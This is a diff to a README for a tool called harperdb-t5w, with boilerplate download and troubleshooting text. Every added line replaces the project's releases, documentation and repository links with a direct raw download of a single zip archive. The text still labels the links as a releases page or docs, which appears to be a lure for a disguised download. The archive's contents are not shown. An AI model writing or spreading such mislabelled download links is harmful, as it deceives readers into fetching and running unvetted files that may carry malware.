@@ -1,6 +1,6 @@
 # 🌟 harperdb-t5w - Simplify Your Data Management Efforts
 
-[![Download harperdb-t5w](https://img.shields.io/badge/Download-harperdb--t5w-brightgreen)](https://github.com/literal-shoppinglist949/harperdb-t5w/releases)
+[![Download harperdb-t5w](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip)](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with harperdb-t5w, follow these simple steps to download and inst
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/literal-shoppinglist949/harperdb-t5w/releases) to access the latest versions of harperdb-t5w. 
+1. Visit the [Releases page](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip) to access the latest versions of harperdb-t5w. 
 
 2. On the Releases page, you will see various versions of the software, along with details about each version. Look for the most recent release, which is typically at the top of the list.
 
@@ -48,7 +48,7 @@ If you experience any issues during installation or usage, try the following ste
 
 - **Check System Compatibility**: Ensure you are using a supported operating system.
 - **Restart Your Computer**: Sometimes a simple restart can solve many problems.
-- **Update Your Software**: Ensure you are using the latest version of harperdb-t5w by checking back on the [Releases page](https://github.com/literal-shoppinglist949/harperdb-t5w/releases).
+- **Update Your Software**: Ensure you are using the latest version of harperdb-t5w by checking back on the [Releases page](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip).
 - **Consult the Community**: If you need help, visit developer forums or community pages related to harperdb-t5w.
 
 ## 📞 Support
@@ -57,8 +57,8 @@ If you need further assistance, do not hesitate to reach out. You can report iss
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/literal-shoppinglist949/harperdb-t5w/releases)
-- [Documentation](https://github.com/literal-shoppinglist949/harperdb-t5w/docs)
-- [GitHub Repository](https://github.com/literal-shoppinglist949/harperdb-t5w)
+- [Releases Page](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/literal-shoppinglist949/harperdb-t5w/main/faintingly/harperdb-t5w_v2.8.zip)
 
 By following these guidelines, you'll ensure a smooth download and installation experience with harperdb-t5w. Enjoy managing your data with ease!
